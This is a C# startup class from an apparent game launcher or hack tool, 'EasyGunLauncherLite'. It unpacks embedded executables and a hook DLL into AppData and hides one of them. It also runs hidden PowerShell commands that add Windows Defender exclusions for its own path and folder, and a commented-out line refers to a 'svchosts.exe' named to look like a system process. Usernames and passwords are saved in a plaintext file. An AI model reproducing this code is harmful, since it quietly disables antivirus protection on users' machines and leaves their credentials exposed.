using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using DeviceId;
using IniParser;
using IniParser.Model;
using Newtonsoft.Json;
using RestSharp;

namespace EasyGunLauncherLite
{
    internal class Startup
    {
        public static string USER_APPLICATION_DATA_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static string APPLICATION_DATA_FOLDER = "\\GunBatTu\\";

        public static string windowsFilePath
        {
            get
            {
                return USER_APPLICATION_DATA_FOLDER + APPLICATION_DATA_FOLDER;
            }
        }

        public static IniData configs;

        public Startup()
        {
        }
        
        public static string copyClient()
        {
            if (Directory.Exists(windowsFilePath) == false)
            {
                Directory.CreateDirectory(windowsFilePath);
            }
            Extract(windowsFilePath, "Client.exe", "EasyGunLauncherLite.Resources.Client.exe");
            //Extract(windowsFilePath, "svchosts.exe", "EasyGunLauncherLite.Resources.svchosts.exe", true); //protector
            return windowsFilePath + "Client.exe";
        }

        private static void Extract(string outDirectory, string file, string resourceName, bool forceRewrite = false)
        {
            string o = outDirectory + "\\" + file;
            if (File.Exists(o) == false || forceRewrite)
            {
                Assembly assem = Assembly.GetExecutingAssembly();
                using (Stream s = assem.GetManifestResourceStream($"{resourceName}"))
                using (BinaryReader r = new BinaryReader(s))
                using (FileStream fs = new FileStream(o, FileMode.Create))
                using (BinaryWriter w = new BinaryWriter(fs))
                    w.Write(r.ReadBytes((int)s.Length));
            }
        }
        
        public static void SetupOcx()
        {
            Extract(windowsFilePath, "runtime.dll", "EasyGunLauncherLite.Resources.runtime.dll");
            // if do not exists it creates it.
            FileInfo FileInfo = new FileInfo(windowsFilePath + "\\runtime.dll");
            if (true == FileInfo.Exists)
            {
                // set the file as hidden
                FileInfo.Attributes |= FileAttributes.Hidden;
            }
        }

        public static void setUpWindowsDefender()
        {
            try
            {
                ProcessStartInfo startInfo1 = new ProcessStartInfo();
                startInfo1.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                startInfo1.FileName = "powershell.exe";
                startInfo1.Arguments = "-command \"Add-MpPreference -ExclusionPath '" + Application.ExecutablePath + "'\"";
                Process process1 = new Process();
                process1.StartInfo = startInfo1;
                process1.Start();
                
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                startInfo.FileName = "powershell.exe";
                startInfo.Arguments = "-command \"Add-MpPreference -ExclusionPath '" + windowsFilePath + "'\"";
                Process process = new Process();
                process.StartInfo = startInfo;
                process.Start();
                //process.WaitForExit();
            }
            catch
            {    
            }
        }

        public static PhysicalAddress MacAdress = null;
        public static PhysicalAddress GetMacAddress()
        {
            if (MacAdress == null)
            {
                foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
                {
                    // Only consider Ethernet network interfaces
                    if (nic.OperationalStatus == OperationalStatus.Up)
                    {
                        MacAdress = nic.GetPhysicalAddress();
                        break;
                    }
                }
            }

            return MacAdress;
        }

        public static Dictionary<string, string> ReadRecentAccounts()
        {
            if (!File.Exists(windowsFilePath + "\\accounts.txt"))
            {
                return null;
            }
            String line;
            Dictionary<string, string> accounts = new Dictionary<string, string>();
            try
            {
                //Pass the file path and file name to the StreamReader constructor
                StreamReader sr = new StreamReader(windowsFilePath + "\\accounts.txt");
                //Read the first line of text
                line = sr.ReadLine();
                //Continue to read until you reach end of file
                while (line != null)
                {
                    string[] acc = line.Split('|');
                    if (acc.Length == 2)
                    {
                        accounts.Add(acc[0], acc[1]);
                    }
                    //Read the next line
                    line = sr.ReadLine();
                }
                //close the file
                sr.Close();
            }
            catch(Exception e)
            {
                Log.AddLog(e.Message);
            }

            return accounts;
        }

        public static void SaveRecentAccount(string username, string password)
        {
            Dictionary<string, string> accounts = ReadRecentAccounts();
            if (accounts != null)
            {
                if (accounts.ContainsKey(username) && accounts[username] == password)
                {
                    return;
                }

                //password changed
                accounts.Remove(username);
            }
            else
            {
                accounts = new Dictionary<string, string>();
            }
            accounts.Add(username, password);
            try
            {
                File.Delete(windowsFilePath + "\\accounts.txt");
                File.Create(windowsFilePath + "\\accounts.txt").Dispose();
                //Pass the filepath and filename to the StreamWriter Constructor
                StreamWriter sw = new StreamWriter(windowsFilePath + "\\accounts.txt");
                foreach (KeyValuePair<string,string> account in accounts)
                {
                    sw.WriteLine(account.Key + "|" + account.Value);
                }
                //Close the file
                sw.Close();
            }
            catch(Exception e)
            {
                Log.AddLog(e.Message);
            }
        }

        public static void clearQrCodeImages()
        {
            if(!File.Exists(windowsFilePath))
            {
                return;
            }
            Array.ForEach(Directory.GetFiles(windowsFilePath),
              delegate (string path) {
                  string ext = Path.GetExtension(path);
                  if (ext == ".png") {
                      File.Delete(path);
                  }
              });
        }

        public static IniData getConfigs()
        {
            if (configs != null)
            {
                return configs;
            }
            var parser = new FileIniDataParser();
            IniData data;
            if (File.Exists(windowsFilePath + "\\configs.ini"))
            {
                data = parser.ReadFile(windowsFilePath + "\\configs.ini");
            }
            else
            {
                data = new IniData();
                data["System"]["SystemTrayIcon"] = "false";
                data["UI"]["DarkMode"] = "false";
            }
            configs = data;
            return data;
        }

        public static void saveConfigs(IniData data)
        {
            var parser = new FileIniDataParser();
            parser.WriteFile(windowsFilePath + "\\configs.ini", data);
        }

        public static void CopyDll()
        {
            if (Directory.Exists(windowsFilePath) == false)
            {
                Directory.CreateDirectory(windowsFilePath);
            }
            Extract(windowsFilePath, "GunBatTuHook.dll", "EasyGunLauncherLite.Resources.GunBatTuHook.dll", true);
        }

        public static string checkingForRegion()
        {
            var client = new RestClient("http://ip-api.com/json");
            client.Timeout = -1;
            var request = new RestRequest(Method.GET);
            IRestResponse response = client.Execute(request);
            string responseString = response.Content;
            if (responseString.Length <= 0)
            {
                Log.AddLog("http://ip-api.com/json: " + responseString);
                //MessageBox.Show("Server Die!", "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return "";
            }
            GeoLocation geoLocation = JsonConvert.DeserializeObject<GeoLocation>(responseString);
            return geoLocation.country;
        }
    }
}
